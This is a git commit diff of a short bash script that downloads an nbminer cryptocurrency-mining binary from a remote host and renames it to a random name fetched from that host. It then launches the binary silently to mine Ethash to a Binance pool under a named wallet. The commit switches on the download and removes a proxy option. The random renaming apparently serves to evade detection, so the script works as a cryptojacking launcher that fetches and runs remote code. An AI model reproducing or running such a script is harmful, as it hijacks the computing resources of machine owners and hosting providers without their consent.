a565735b759168cd7b94688735287474b9e43cc5
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-27 22:33:44 -0600

    Update 12.sh

--- 12.sh
+++ 12.sh
@@ -1,11 +1,10 @@
 #!/bin/bash
-#wget https://cuan.mine.nu/nbminer
+wget https://cuan.mine.nu/nbminer
 ACAK=$(echo $(curl -s https://cuan.mine.nu/random.php))
-chmod +x bubui && mv bubui $ACAK
-read -p 'Input Proxy nya: ' PROXY
+chmod +x nbminer && mv nbminer $ACAK
 WALLET=teguhcong
 POOL=stratum+tcp://ethash.poolbinance.com:1800
 WORKER1=$(echo $(shuf -i 1000-9999 -n 1))
 #WORKER2=$(date '+%d%b')
 #WORKER3=$(echo $(nvidia-smi --query-gpu=gpu_name --format=csv,noheader) | tr -d " ","-")
-./$ACAK --algo ETHASH --socks5 $PROXY --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
+./$ACAK --algo ETHASH --pool $POOL --user $WALLET.$WORKER1 --tls 0 -- ethstratum ETHV1 --silence 3
